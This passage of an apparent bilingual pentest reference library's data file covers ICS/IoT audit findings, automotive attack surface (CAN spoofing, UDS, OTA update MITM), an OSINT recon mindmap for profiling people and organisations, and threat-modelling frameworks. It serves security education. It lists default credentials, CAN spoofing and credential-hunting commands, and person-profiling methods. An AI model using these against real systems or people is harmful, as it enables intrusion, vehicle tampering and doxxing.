  <li><strong>Passive Baseline.</strong> Span-Port + Zeek mit ICS-Protokoll-Parsern. Inventar, Vendor, Firmware-Versionen, anomale externe Connections.</li>
  <li><strong>Im Replica-Lab testen.</strong> Echte PLCs + simulierte I/O. Aktive Exploitation nicht gegen live Prozess testen.</li>
</ul>

<h2>ICS — wiederkehrende Befunde</h2>
<ul>
  <li><strong>Flat L2 zwischen IT und OT.</strong> Eine kompromittierte Workstation kann Modbus zu jedem PLC sprechen. IT-/OT-Segmentierungs-Gateway fordern (CheckPoint 1570R, Cisco IE3000, Hirschmann).</li>
  <li><strong>Direkte Internet-Exposition.</strong> Shodan <code>port:502 country:DE</code>. Findet noch jede Woche PLCs.</li>
  <li><strong>Default-Web-HMI-Creds.</strong> <code>admin:admin</code> auf Schneider Magelis, Wonderware, B&amp;R, Mitsubishi-Web-HMIs.</li>
  <li><strong>Ungepatchte Firmware.</strong> Vendor-Patches hängen IT um Jahre hinterher; Field-Firmware hängt Vendor-Patches um Jahre hinterher. Kumulative Lücke häufig 5+ Jahre.</li>
  <li><strong>Remote-Support-Tunnels.</strong> Vendor-Support hat TeamViewer/AnyDesk jahrelang offen gelassen. Finden und dokumentieren.</li>
</ul>

<h2>IoT — CSA-orientierte Audit-Schichten</h2>
<ul>
  <li><strong>Device.</strong> Firmware-Extraktion (<code>binwalk</code>, UART-/JTAG-/SPI-Dump), Strings-Analyse für hardcodierte Creds, aktiv gelassene Debug-Interfaces. <code>fwup</code>-Tool prüft auf signierte Firmware.</li>
  <li><strong>Edge.</strong> Lokale Kommunikation (BLE, Zigbee, Z-Wave, Matter/Thread). Pairing-Flow-Review, Key-Storage, Mesh-Isolation zwischen Räumen/Mietern.</li>
  <li><strong>Netzwerk.</strong> WAN-Protokoll (MQTT, CoAP, HTTP), TLS-Posture, Cert-Pinning, Mutual-Auth.</li>
  <li><strong>Cloud.</strong> Companion-API — gleicher Web-App-Audit wie jedes SaaS. AuthZ über User-/Device-/Admin-Rollen. Die meisten Takeovers passieren hier.</li>
  <li><strong>Lifecycle.</strong> Update-Kanal (signiert? Rollback-protected? vom Angreifer deaktivierbar?). End-of-Life-Policy (funktioniert die Cloud-Seite weiter, nachdem Vendor das Modell sunsetet?). Vulnerability-Disclosure-Pfad.</li>
</ul>

<h2>Häufige IoT-Befunde</h2>
<ul>
  <li><strong>Hardcodierte Creds in Firmware.</strong> <code>strings firmware.bin | grep -i 'pass\\|user\\|key'</code>.</li>
  <li><strong>Cloud-API vertraut Device-seitigen Identity-Claims.</strong> Device-ID im Cloud-Request spoofen → Zugriff auf Daten beliebiger User.</li>
  <li><strong>Unverschlüsseltes Local-Mesh.</strong> Zigbee mit Default-Network-Key.</li>
  <li><strong>Companion-App speichert Cloud-Token in plain SharedPreferences.</strong> Jede malicious App auf gleichem Android-Device liest ihn.</li>
  <li><strong>Keine Revocation.</strong> Gestohlenes Gerät, verlorenes Gerät — Cloud hat keinen Weg, den Device-Auth-Token zu invalidieren ohne den User zu resetten.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>Für ICS immer passive Beobachtung; aktives Testen nur in Lab-Replika oder unter schriftlichem Wartungsfenster mit dem Plant-Operator daneben. Für IoT ist die Cloud-seitige Companion-API meist der Pfad mit dem meisten Impact und dem geringsten operativen Risiko.</div>
`
    ),
    phases: ["recon", "cves", "report"]
  },
  {
    id: "automotive-security",
    domain: "ot-embedded", tier: 3,
    title: T("Automotive Security — Reference", "Automotive Security — Referenz"),
    blurb: T(
      "Vehicle attack surface map: in-cabin networks, telematics gateway, software-update channel, supplier dependency graph.",
      "Angriffsfläche eines Fahrzeugs: In-Cabin-Netze, Telematik-Gateway, Software-Update-Kanal, Lieferanten-Abhängigkeitsgraph."
    ),
    body: B(
      `
<h2>In-cabin networks</h2>
<ul>
  <li><strong>CAN (classical).</strong> Multi-master broadcast, 1 Mbit/s, no auth, no encryption. Every node sees every message. Spoof = send arbitrary CAN ID at higher priority and win arbitration. <code>candump can0</code>, <code>cansend can0 123#DEADBEEF</code> from <code>can-utils</code>.</li>
  <li><strong>CAN FD.</strong> Same protocol, higher bitrate (5 Mbit/s typical), larger payload (64 bytes). Same lack of auth.</li>
  <li><strong>Automotive Ethernet.</strong> 100/1000BASE-T1 single-pair. Some deployments add MACsec for L2 authentication; many don't.</li>
  <li><strong>LIN, FlexRay, MOST.</strong> Lower-rate buses for body electronics, X-by-wire, infotainment. Each has own bus + own quirks.</li>
  <li><strong>Domain bridges.</strong> The control units that gateway between buses are the choke point. Compromise the gateway = cross-domain control.</li>
</ul>

<h2>Telematics gateway / TCU</h2>
<ul>
  <li><strong>External surfaces.</strong> Cellular modem (LTE/5G), Bluetooth (BLE pairing flow), Wi-Fi hotspot, sometimes V2X.</li>
  <li><strong>Backend API.</strong> Vehicle authenticates to OEM cloud with per-vehicle cert + token. App-side API for mobile companion app. Both are HTTP services — same web-app review applies.</li>
  <li><strong>Famous failure patterns.</strong> Cellular telematics with publicly resolvable internal hostnames; vehicle-side token reused across the entire fleet; flat backend API where vehicle-ID is the only authz.</li>
  <li><strong>Partitioning.</strong> Modern gateway separates infotainment domain from powertrain domain via hypervisor or dedicated MCU. Bypass = exploit hypervisor escape or find unintended bridge (USB, BT-to-CAN debug, supplier diagnostic port).</li>
</ul>

<h2>Diagnostics — UDS / OBD-II</h2>
<ul>
  <li><strong>OBD-II port.</strong> Physical access, mandated worldwide. Direct CAN access. Aftermarket dongles often leave it permanently bridged to Bluetooth/Wi-Fi.</li>
  <li><strong>UDS (ISO 14229).</strong> Diagnostic protocol layered on CAN. Service IDs: 0x10 DiagnosticSessionControl, 0x27 SecurityAccess (seed/key challenge), 0x34/0x36/0x37 RequestDownload/TransferData/RequestTransferExit for firmware flashing.</li>
  <li><strong>SecurityAccess weakness.</strong> Seed→key algorithm historically reverse-engineerable from one tool DLL or one captured pair. Modern AUTOSAR uses crypto + per-ECU keys; legacy doesn't.</li>
  <li><strong>Engineering services left enabled.</strong> ECUs in production with engineering-mode UDS services unlocked. Diagnostic protocol becomes RCE chain.</li>
</ul>

<h2>OTA update channel</h2>
<ul>
  <li><strong>Uptane reference framework.</strong> Two metadata roles (director + image repo), per-vehicle targeting, rollback protection. Adoption uneven.</li>
  <li><strong>Common failures.</strong> Update package signed but rollback-protection missing (downgrade attack); per-vehicle targeting absent (push attacker payload to one vehicle by spoofing VIN); supplier-signed ECU images accepted by gateway without cross-OEM check.</li>
  <li><strong>Test.</strong> Capture update flow with man-in-the-middle on the TCU's HTTPS. Without proper cert pinning, you can substitute the image.</li>
</ul>

<h2>Supplier dependency graph</h2>
<ul>
  <li>A modern vehicle has 50–150 ECUs from dozens of Tier-1 suppliers. Each supplier has their own code base, debug interfaces, key management.</li>
  <li>OEM security posture is bounded by the weakest Tier-1. UNECE R155 (cybersecurity) and R156 (software update) push OEMs to track supplier posture; coverage in practice varies.</li>
  <li>Recurring finding: Tier-1 ECU ships with debug shell, OEM integration doesn't disable it.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>Automotive engagements always start with the TCU and its backend API. That's where remote exploitation is possible; everything in-cabin (CAN replay, UDS abuse) requires physical access and is mostly relevant for theft scenarios, not for remote compromise.</div>
`,
      `
<h2>In-Cabin-Netze</h2>
<ul>
  <li><strong>CAN (classical).</strong> Multi-Master-Broadcast, 1 Mbit/s, keine Auth, keine Verschlüsselung. Jeder Node sieht jede Message. Spoofen = beliebige CAN-ID mit höherer Priorität senden und Arbitration gewinnen. <code>candump can0</code>, <code>cansend can0 123#DEADBEEF</code> aus <code>can-utils</code>.</li>
  <li><strong>CAN FD.</strong> Gleiches Protokoll, höhere Bitrate (5 Mbit/s typisch), größerer Payload (64 Bytes). Gleiche fehlende Auth.</li>
  <li><strong>Automotive Ethernet.</strong> 100/1000BASE-T1 Single-Pair. Einige Deployments fügen MACsec für L2-Authentifizierung hinzu; viele nicht.</li>
  <li><strong>LIN, FlexRay, MOST.</strong> Niedrigratige Busse für Body-Elektronik, X-by-Wire, Infotainment. Eigener Bus + eigene Quirks pro Bus.</li>
  <li><strong>Domain-Bridges.</strong> Die Steuerunits, die zwischen Bussen gatewayen, sind der Engpass. Gateway kompromittieren = Cross-Domain-Kontrolle.</li>
</ul>

<h2>Telematik-Gateway / TCU</h2>
<ul>
  <li><strong>Externe Oberflächen.</strong> Cellular-Modem (LTE/5G), Bluetooth (BLE-Pairing-Flow), Wi-Fi-Hotspot, manchmal V2X.</li>
  <li><strong>Backend-API.</strong> Fahrzeug authentifiziert sich zur OEM-Cloud mit per-Fahrzeug-Cert + Token. App-seitige API für mobile Companion-App. Beide sind HTTP-Services — gleicher Web-App-Review gilt.</li>
  <li><strong>Berühmte Fehler-Muster.</strong> Cellular-Telematik mit öffentlich auflösbaren internen Hostnames; fahrzeug-seitiger Token über die ganze Flotte wiederverwendet; flache Backend-API wo Fahrzeug-ID einzige AuthZ ist.</li>
  <li><strong>Partitionierung.</strong> Modernes Gateway trennt Infotainment-Domäne von Powertrain-Domäne via Hypervisor oder dediziertem MCU. Bypass = Hypervisor-Escape exploiten oder unbeabsichtigte Bridge finden (USB, BT-zu-CAN-Debug, Supplier-Diagnostic-Port).</li>
</ul>

<h2>Diagnostik — UDS / OBD-II</h2>
<ul>
  <li><strong>OBD-II-Port.</strong> Physischer Zugriff, weltweit vorgeschrieben. Direkter CAN-Zugriff. Aftermarket-Dongles lassen oft permanent zu Bluetooth/Wi-Fi gebrückt.</li>
  <li><strong>UDS (ISO 14229).</strong> Diagnose-Protokoll geschichtet auf CAN. Service-IDs: 0x10 DiagnosticSessionControl, 0x27 SecurityAccess (Seed/Key-Challenge), 0x34/0x36/0x37 RequestDownload/TransferData/RequestTransferExit für Firmware-Flashing.</li>
  <li><strong>SecurityAccess-Schwäche.</strong> Seed→Key-Algorithmus historisch aus einer Tool-DLL oder einem gecapturten Paar reverse-engineerbar. Modernes AUTOSAR nutzt Crypto + per-ECU-Keys; Legacy nicht.</li>
  <li><strong>Engineering-Services aktiv gelassen.</strong> ECUs in Produktion mit freigeschalteten Engineering-Mode-UDS-Services. Diagnose-Protokoll wird zur RCE-Kette.</li>
</ul>

<h2>OTA-Update-Kanal</h2>
<ul>
  <li><strong>Uptane-Referenz-Framework.</strong> Zwei Metadata-Roles (Director + Image-Repo), per-Fahrzeug-Targeting, Rollback-Protection. Adoption uneinheitlich.</li>
  <li><strong>Häufige Fehler.</strong> Update-Paket signiert, aber Rollback-Protection fehlt (Downgrade-Attack); per-Fahrzeug-Targeting fehlt (Angreifer-Payload an ein Fahrzeug durch VIN-Spoofing pushen); Supplier-signierte ECU-Images vom Gateway ohne Cross-OEM-Check akzeptiert.</li>
  <li><strong>Test.</strong> Update-Flow mit Man-in-the-Middle auf der HTTPS der TCU capturen. Ohne sauberes Cert-Pinning kannst du das Image substituieren.</li>
</ul>

<h2>Supplier-Dependency-Graph</h2>
<ul>
  <li>Ein modernes Fahrzeug hat 50–150 ECUs von Dutzenden Tier-1-Suppliern. Jeder Supplier hat eigenes Codebase, Debug-Interfaces, Key-Management.</li>
  <li>OEM-Sicherheits-Posture wird durch den schwächsten Tier-1 begrenzt. UNECE R155 (Cybersecurity) und R156 (Software-Update) pushen OEMs, Supplier-Posture zu tracken; Abdeckung in der Praxis schwankt.</li>
  <li>Wiederkehrender Befund: Tier-1-ECU shippt mit Debug-Shell, OEM-Integration deaktiviert sie nicht.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>Automotive-Engagements starten immer mit der TCU und ihrer Backend-API. Dort ist Remote-Exploitation möglich; alles In-Cabin (CAN-Replay, UDS-Missbrauch) erfordert physischen Zugriff und ist meist für Diebstahl-Szenarien relevant, nicht für Remote-Compromise.</div>
`
    ),
    phases: ["report"]
  },

  // ─────────────────────────────────────────────────────────────
  // 05 — THREAT INTELLIGENCE & ADVERSARY MODELING
  // ─────────────────────────────────────────────────────────────
  {
    id: "osint-mindmap",
    domain: "threat-intelligence", tier: 1,
    title: T("OSINT — Recon Mindmap", "OSINT — Recon-Mindmap"),
    blurb: T(
      "Open-source intelligence routes by entity type: people, organizations, infrastructure, code, leaks. The recon companion to engagement scoping.",
      "OSINT-Wege nach Entity-Typ: Personen, Organisationen, Infrastruktur, Code, Leaks. Recon-Begleiter zum Engagement-Scoping."
    ),
    body: B(
      `
<h2>People</h2>
<ul>
  <li><strong>Name → email.</strong> Hunter.io, Apollo, RocketReach for paid; <code>theHarvester</code>, <code>emailrep.io</code> for free. Validate via SMTP recipient probe (RCPT TO) or Microsoft <code>GetCredentialType</code> endpoint for O365 tenants.</li>
  <li><strong>Email → presence.</strong> HaveIBeenPwned (breach list), Skype/Teams presence ping, Spotify public profile, GitHub no-reply email match.</li>
  <li><strong>Name → social handles.</strong> <code>sherlock</code>, <code>maigret</code> for username sweep across 350+ sites. Cross-reference profile pictures for face match.</li>
  <li><strong>Name → role.</strong> LinkedIn (primary); GitHub org pages; conference speaker bios; SEC filings for execs of US public companies.</li>
  <li><strong>Cross-correlation.</strong> Same username across 3+ unrelated sites + 1 photo match = confident identity. Reverse-image search via Yandex (best for faces), Google, TinEye.</li>
</ul>

<h2>Organizations</h2>
<ul>
  <li><strong>Corporate structure.</strong> Handelsregister (DE), Companies House (UK), SEC EDGAR (US), OpenCorporates (multi-jurisdiction). Reveals subsidiaries, directors, beneficial owners.</li>
  <li><strong>Job postings.</strong> Single most underused recon source. Job postings list internal tech stack ("experience with Splunk and Crowdstrike"), team names, reporting lines.</li>
  <li><strong>Press releases &amp; case studies.</strong> Vendor case studies disclose customer's internal architecture details verbatim. <code>site:vendor.com "$TARGET"</code>.</li>
  <li><strong>Procurement portals.</strong> Government contracts show technology investments, vendors, project timelines.</li>
</ul>

<h2>Infrastructure</h2>
<ul>
  <li><strong>IP space.</strong> ARIN/RIPE/APNIC whois → org netblocks. <code>asnlookup</code>, BGP toolkit for the ASN graph.</li>
  <li><strong>CT logs.</strong> <code>crt.sh?q=%25.target.com</code> for every cert ever issued under the domain. Historical certs reveal old subdomains and conventions.</li>
  <li><strong>Third-party SaaS dependencies.</strong> <code>builtwith.com</code>, DNS MX/SPF records (MX = mail provider, SPF authorized senders = SaaS list).</li>
  <li><strong>Shodan / Censys / FOFA.</strong> <code>org:"Target Corp"</code>, <code>ssl:"Target"</code>, <code>http.title:"Target Admin"</code>.</li>
  <li><strong>Subdomain enumeration.</strong> Already documented in recon entry; CT logs + DNS bruteforce + JS scraping in parallel.</li>
</ul>

<h2>Code</h2>
<ul>
  <li><strong>GitHub.</strong> <code>org:target-corp</code> + secrets search. <code>github.com/search?q=org%3Atarget+AWS_SECRET_KEY</code>. Watch contributors' personal repos — secrets often leak in personal projects copied from work.</li>
  <li><strong>GitLab self-hosted.</strong> <code>gitlab.target.com</code> often public-visible repos by accident.</li>
  <li><strong>npm / PyPI.</strong> Published packages reveal internal package names → potential dependency-confusion attack surface.</li>
  <li><strong>Docker Hub.</strong> <code>hub.docker.com/u/targetcorp</code>. Layers may contain leaked secrets, internal IPs, build scripts.</li>
  <li><strong>Mobile app stores.</strong> Pull APK/IPA, run secret-scanner. Companion apps frequently leak API keys.</li>
</ul>

<h2>Leaks &amp; breach data</h2>
<ul>
  <li><strong>HaveIBeenPwned.</strong> Per-account breach exposure check. Doesn't reveal passwords; reveals which breaches an account is in.</li>
  <li><strong>Dehashed, Snusbase, Leak-Lookup.</strong> Paid services with searchable plaintext from public dumps. Engage only within written legal scope.</li>
  <li><strong>Combolists.</strong> Aggregated credential lists circulating on cybercrime forums. Most are recycled stuffing fodder, not fresh breaches.</li>
  <li><strong>Cross-corroboration.</strong> A "fresh breach" claim that doesn't appear on any reputable index after 2 weeks is usually fake or repackaged.</li>
  <li><strong>Legal posture.</strong> Use breach data for engagement-relevant analysis only (e.g. confirming a target's email is in a breach to score phishing realism). Don't store full breach datasets unless contract explicitly permits.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>Start every engagement with two hours of pure OSINT before touching active scanners. The map you build determines which attacks are even worth considering. Skipping this step is how testers spend a week brute-forcing a hardened service while a forgotten staging subdomain with default creds was waiting one hop away.</div>
`,
      `
<h2>Personen</h2>
<ul>
  <li><strong>Name → E-Mail.</strong> Hunter.io, Apollo, RocketReach paid; <code>theHarvester</code>, <code>emailrep.io</code> kostenlos. Validieren via SMTP-Recipient-Probe (RCPT TO) oder Microsoft <code>GetCredentialType</code>-Endpoint für O365-Tenants.</li>
  <li><strong>E-Mail → Präsenz.</strong> HaveIBeenPwned (Breach-Liste), Skype-/Teams-Presence-Ping, Spotify-Public-Profil, GitHub-No-Reply-Email-Match.</li>
  <li><strong>Name → Social-Handles.</strong> <code>sherlock</code>, <code>maigret</code> für Username-Sweep über 350+ Sites. Cross-Reference Profilbilder für Face-Match.</li>
  <li><strong>Name → Rolle.</strong> LinkedIn (primär); GitHub-Org-Seiten; Conference-Speaker-Bios; SEC-Filings für Execs US-börsennotierter Firmen.</li>
  <li><strong>Cross-Correlation.</strong> Gleicher Username auf 3+ unverbundenen Sites + 1 Photo-Match = vertrauensvolle Identität. Reverse-Image-Search via Yandex (beste für Gesichter), Google, TinEye.</li>
</ul>

<h2>Organisationen</h2>
<ul>
  <li><strong>Unternehmensstruktur.</strong> Handelsregister (DE), Companies House (UK), SEC EDGAR (US), OpenCorporates (multi-Jurisdiktion). Zeigt Töchter, Geschäftsführer, wirtschaftliche Eigentümer.</li>
  <li><strong>Stellenanzeigen.</strong> Einzige meistunterschätzte Recon-Quelle. Stellenanzeigen listen interne Tech-Stacks ("Erfahrung mit Splunk und Crowdstrike"), Team-Namen, Reporting-Linien.</li>
  <li><strong>Pressemitteilungen &amp; Case-Studies.</strong> Vendor-Case-Studies offenbaren wörtlich interne Architektur-Details des Kunden. <code>site:vendor.com "$TARGET"</code>.</li>
  <li><strong>Procurement-Portale.</strong> Regierungsverträge zeigen Tech-Investments, Vendors, Projekt-Zeitleisten.</li>
</ul>

<h2>Infrastruktur</h2>
<ul>
  <li><strong>IP-Raum.</strong> ARIN/RIPE/APNIC-Whois → Org-Netblocks. <code>asnlookup</code>, BGP-Toolkit für ASN-Graph.</li>
  <li><strong>CT-Logs.</strong> <code>crt.sh?q=%25.target.com</code> für jedes je ausgestellte Cert unter der Domain. Historische Certs verraten alte Subdomains und Konventionen.</li>
  <li><strong>Third-Party-SaaS-Dependencies.</strong> <code>builtwith.com</code>, DNS-MX-/SPF-Records (MX = Mail-Provider, SPF-Authorized-Senders = SaaS-Liste).</li>
  <li><strong>Shodan / Censys / FOFA.</strong> <code>org:"Target Corp"</code>, <code>ssl:"Target"</code>, <code>http.title:"Target Admin"</code>.</li>
  <li><strong>Subdomain-Enumeration.</strong> Bereits im Recon-Eintrag dokumentiert; CT-Logs + DNS-Bruteforce + JS-Scraping parallel.</li>
</ul>

<h2>Code</h2>
<ul>
  <li><strong>GitHub.</strong> <code>org:target-corp</code> + Secrets-Search. <code>github.com/search?q=org%3Atarget+AWS_SECRET_KEY</code>. Persönliche Repos von Contributors beobachten — Secrets leaken oft in privaten Projekten, die aus Arbeit kopiert wurden.</li>
  <li><strong>GitLab self-hosted.</strong> <code>gitlab.target.com</code> oft versehentlich public-sichtbar.</li>
  <li><strong>npm / PyPI.</strong> Publizierte Packages verraten interne Package-Namen → potenzielle Dependency-Confusion-Angriffsfläche.</li>
  <li><strong>Docker Hub.</strong> <code>hub.docker.com/u/targetcorp</code>. Layer können geleakte Secrets, interne IPs, Build-Skripte enthalten.</li>
  <li><strong>Mobile App Stores.</strong> APK/IPA ziehen, Secret-Scanner laufen lassen. Companion-Apps leaken häufig API-Keys.</li>
</ul>

<h2>Leaks &amp; Breach-Data</h2>
<ul>
  <li><strong>HaveIBeenPwned.</strong> Per-Account-Breach-Exposure-Check. Offenbart keine Passwörter; offenbart in welchen Breaches ein Account ist.</li>
  <li><strong>Dehashed, Snusbase, Leak-Lookup.</strong> Paid-Services mit durchsuchbarem Plaintext aus öffentlichen Dumps. Nur im schriftlich vereinbarten Legal-Scope nutzen.</li>
  <li><strong>Combolists.</strong> Aggregierte Credential-Listen, die auf Cybercrime-Foren zirkulieren. Die meisten sind recycelter Stuffing-Stoff, keine frischen Breaches.</li>
  <li><strong>Cross-Corroboration.</strong> Ein "Fresh Breach"-Claim, der nach 2 Wochen auf keinem seriösen Index erscheint, ist meist fake oder repackaged.</li>
  <li><strong>Juristische Haltung.</strong> Breach-Data nur für engagement-relevante Analyse nutzen (z.B. zur Bestätigung, dass eine Ziel-E-Mail in einem Breach ist, für Phishing-Realismus). Volle Breach-Datasets nicht speichern, außer Vertrag erlaubt es explizit.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>Jedes Engagement mit zwei Stunden reiner OSINT starten, bevor aktive Scanner angefasst werden. Die so gebaute Karte bestimmt, welche Angriffe überhaupt erwägenswert sind. Diesen Schritt zu überspringen ist, wie Tester eine Woche damit verbringen, einen gehärteten Service zu bruten, während eine vergessene Staging-Subdomain mit Default-Creds einen Hop entfernt wartete.</div>
`
    ),
    phases: ["recon", "osint"]
  },
  {
    id: "threat-modeling-canon",
    domain: "threat-intelligence", tier: 3,
    title: T("Threat Modeling — Canonical Reference", "Threat Modeling — kanonische Referenz"),
    blurb: T(
      "STRIDE, LINDDUN, attack-tree, and the Diamond model as a structured note-taking template — paired with the preventive and responsive control maps over the attack lifecycle.",
      "STRIDE, LINDDUN, Attack-Tree und das Diamond Model als strukturiertes Notiz-Template — gepaart mit präventiven und reaktiven Control-Karten über den Angriffslebenszyklus."
    ),
    body: B(
      `
<h2>STRIDE — per-component threat enumeration</h2>
<ul>
  <li><strong>S</strong>poofing — identity claim is fake. Defense: authentication.</li>
  <li><strong>T</strong>ampering — data modified in transit or at rest. Defense: integrity (signatures, MACs).</li>
  <li><strong>R</strong>epudiation — actor denies action. Defense: logging + non-repudiation (signed actions).</li>
  <li><strong>I</strong>nformation disclosure — confidential data leaked. Defense: encryption + access control.</li>
  <li><strong>D</strong>enial of service — availability degraded. Defense: rate-limiting, redundancy, isolation.</li>
  <li><strong>E</strong>levation of privilege — actor gains rights they shouldn't. Defense: authorization, least privilege.</li>
  <li><strong>Workflow.</strong> Draw data-flow diagram → identify trust boundaries → for each element crossing a boundary, walk STRIDE → record threat + mitigation + residual risk.</li>
</ul>

<h2>LINDDUN — privacy threats</h2>
<ul>
  <li><strong>L</strong>inkability — different actions can be linked to same actor.</li>
  <li><strong>I</strong>dentifiability — pseudonymous data can be re-identified.</li>
  <li><strong>N</strong>on-repudiation — actor cannot deny an action (privacy reads this as harm, not as benefit).</li>
  <li><strong>D</strong>etectability — actor can be detected as having performed an action.</li>
  <li><strong>D</strong>isclosure of information — see STRIDE-I.</li>
  <li><strong>U</strong>nawareness — user doesn't know what data is collected/processed.</li>
  <li><strong>N</strong>on-compliance — system violates regulation (GDPR, CCPA).</li>
  <li><strong>When.</strong> Anywhere personal data flows. Right framework for any GDPR/DPIA work.</li>
</ul>

<h2>Attack trees</h2>
<ul>
  <li><strong>Root = adversary objective.</strong> E.g. "exfiltrate customer PII".</li>
  <li><strong>OR-nodes for alternative paths.</strong> Phish admin OR exploit web app OR insider.</li>
  <li><strong>AND-nodes for required combinations.</strong> Phish admin AND bypass MFA.</li>
  <li><strong>Leaf evaluation.</strong> Per leaf: cost, skill, time, detection probability. Cheapest unmitigated leaf = highest-priority defense.</li>
  <li><strong>Mark deployed defenses.</strong> Defended leaves cut off subtrees; remaining paths show actual residual exposure.</li>
</ul>

<h2>Diamond model</h2>
<ul>
  <li><strong>Four vertices.</strong> Adversary, Capability, Infrastructure, Victim. Two meta-features: socio-political (why), technology (how).</li>
  <li><strong>Pivot relationships.</strong> One vertex is anchor (e.g. captured C2 IP = Infrastructure); pivot to other vertices via what's known about that IP (used by which actor? what tooling? hit which victims?).</li>
  <li><strong>Discipline.</strong> Every claim tagged with source + confidence. Vertices without source = "unknown", not best-guess. Best-guess in a Diamond is what produces wrong attribution.</li>
</ul>

<h2>Preventive vs responsive controls across the lifecycle</h2>
<ul>
  <li><strong>Recon / weaponization.</strong> Preventive: minimize external attack surface, OSINT cleanup. Responsive: monitor for reconnaissance patterns (CT log monitoring of own certs, honeypot subdomains).</li>
  <li><strong>Delivery.</strong> Preventive: mail gateway, web gateway, USB controls. Responsive: sandbox detonation alerts, EDR exec telemetry.</li>
  <li><strong>Exploitation.</strong> Preventive: patching, exploit mitigations (CFG, CET, ASLR). Responsive: EDR exploit-behavior detections.</li>
  <li><strong>Installation.</strong> Preventive: app allowlisting, code signing enforcement. Responsive: persistence-location monitoring (autoruns, scheduled tasks).</li>
  <li><strong>Command &amp; control.</strong> Preventive: egress filtering, DNS sinkhole for known-bad. Responsive: NTA detecting C2 beaconing patterns.</li>
  <li><strong>Actions on objective.</strong> Preventive: data-loss prevention, segmentation. Responsive: anomalous-data-egress detection, deception (canary files).</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>Pick the framework by the question you're answering, not by familiarity. STRIDE for component-level threat enumeration. Attack tree for "is X reachable". LINDDUN for privacy. Diamond for incident analysis. Using STRIDE for an incident write-up wastes effort and produces a bad write-up.</div>
`,
      `
<h2>STRIDE — Per-Komponente-Threat-Enumeration</h2>
<ul>
  <li><strong>S</strong>poofing — Identity-Claim ist fake. Verteidigung: Authentifizierung.</li>
  <li><strong>T</strong>ampering — Daten modifiziert in Transit oder at Rest. Verteidigung: Integrity (Signaturen, MACs).</li>
  <li><strong>R</strong>epudiation — Actor leugnet Aktion. Verteidigung: Logging + Non-Repudiation (signierte Actions).</li>
  <li><strong>I</strong>nformation Disclosure — vertrauliche Daten geleakt. Verteidigung: Verschlüsselung + Access-Control.</li>
  <li><strong>D</strong>enial of Service — Verfügbarkeit degradiert. Verteidigung: Rate-Limiting, Redundanz, Isolation.</li>
  <li><strong>E</strong>levation of Privilege — Actor gewinnt Rechte, die er nicht haben sollte. Verteidigung: Autorisierung, Least Privilege.</li>
  <li><strong>Workflow.</strong> Data-Flow-Diagramm zeichnen → Trust-Boundaries identifizieren → pro Element, das eine Grenze überquert, STRIDE durchgehen → Bedrohung + Mitigation + Restrisiko notieren.</li>
</ul>

<h2>LINDDUN — Privacy-Threats</h2>
<ul>
  <li><strong>L</strong>inkability — verschiedene Actions können demselben Actor zugeordnet werden.</li>
  <li><strong>I</strong>dentifiability — pseudonyme Daten können re-identifiziert werden.</li>
  <li><strong>N</strong>on-Repudiation — Actor kann eine Action nicht leugnen (Privacy liest das als Schaden, nicht als Vorteil).</li>
  <li><strong>D</strong>etectability — Actor ist als Ausführender einer Action detektierbar.</li>
  <li><strong>D</strong>isclosure of Information — siehe STRIDE-I.</li>
  <li><strong>U</strong>nawareness — User weiß nicht, welche Daten gesammelt/verarbeitet werden.</li>
  <li><strong>N</strong>on-Compliance — System verletzt Regulation (DSGVO, CCPA).</li>
  <li><strong>Wann.</strong> Überall wo persönliche Daten fließen. Richtiges Framework für jede DSGVO-/DPIA-Arbeit.</li>
</ul>

<h2>Attack-Trees</h2>
<ul>
  <li><strong>Root = Adversary-Objektiv.</strong> Z.B. "Customer-PII exfiltrieren".</li>
  <li><strong>OR-Nodes für alternative Pfade.</strong> Admin phishen ODER Web-App exploiten ODER Insider.</li>
  <li><strong>AND-Nodes für benötigte Kombinationen.</strong> Admin phishen UND MFA umgehen.</li>
  <li><strong>Leaf-Evaluation.</strong> Pro Blatt: Kosten, Skill, Zeit, Detektions-Wahrscheinlichkeit. Billigstes ungemitigtes Blatt = höchstpriorisierte Verteidigung.</li>
  <li><strong>Deployed-Defenses markieren.</strong> Verteidigte Blätter schneiden Subtrees ab; verbleibende Pfade zeigen tatsächliches Restexposure.</li>
</ul>

<h2>Diamond-Modell</h2>
<ul>
  <li><strong>Vier Vertices.</strong> Adversary, Capability, Infrastructure, Victim. Zwei Meta-Features: sozio-politisch (warum), Technologie (wie).</li>
  <li><strong>Pivot-Beziehungen.</strong> Ein Vertex ist Anker (z.B. erbeutete C2-IP = Infrastructure); via dem, was über die IP bekannt ist, zu anderen Vertices pivoten (von welchem Actor genutzt? welches Tooling? welche Victims getroffen?).</li>
  <li><strong>Disziplin.</strong> Jede Behauptung mit Source + Konfidenz getaggt. Vertices ohne Source = "unbekannt", nicht Best-Guess. Best-Guess in einem Diamond ist, was falsche Attribution produziert.</li>
</ul>

<h2>Präventive vs reaktive Controls über den Lifecycle</h2>
<ul>
  <li><strong>Recon / Weaponization.</strong> Präventiv: externe Angriffsfläche minimieren, OSINT-Cleanup. Reaktiv: auf Reconnaissance-Muster überwachen (CT-Log-Monitoring eigener Certs, Honeypot-Subdomains).</li>
  <li><strong>Delivery.</strong> Präventiv: Mail-Gateway, Web-Gateway, USB-Controls. Reaktiv: Sandbox-Detonation-Alerts, EDR-Exec-Telemetrie.</li>
  <li><strong>Exploitation.</strong> Präventiv: Patching, Exploit-Mitigations (CFG, CET, ASLR). Reaktiv: EDR-Exploit-Behavior-Detections.</li>
  <li><strong>Installation.</strong> Präventiv: App-Allowlisting, Code-Signing-Enforcement. Reaktiv: Persistenz-Orte überwachen (Autoruns, Scheduled Tasks).</li>
  <li><strong>Command &amp; Control.</strong> Präventiv: Egress-Filtering, DNS-Sinkhole für Known-Bad. Reaktiv: NTA, das C2-Beaconing-Muster detektiert.</li>
  <li><strong>Actions on Objective.</strong> Präventiv: Data-Loss-Prevention, Segmentierung. Reaktiv: Anomales-Data-Egress-Detection, Deception (Canary-Files).</li>
</ul>
